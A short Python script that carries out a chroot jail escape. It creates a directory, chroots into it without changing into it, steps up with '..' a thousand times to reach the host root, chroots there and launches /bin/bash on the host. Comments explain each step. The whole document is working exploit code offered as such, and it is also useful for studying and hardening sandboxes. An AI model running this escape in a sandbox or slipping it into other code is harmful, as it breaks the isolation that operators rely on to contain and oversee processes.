import os

# Create a directory and chroot to it but we don't want to chdir to it
os.makedirs('foo')
os.chroot('foo')

# pwd still has a reference to a directory outside the (new) chroot
# chdir many times to get to the host root
# The kernel will automatically convert extra ../ to /
for _ in range(1000):
    os.chdir('..')

# finally chroot to the host root
os.chroot('.')

# now we can exec a shell in the host
os.execv('/bin/bash', ['/bin/bash'])
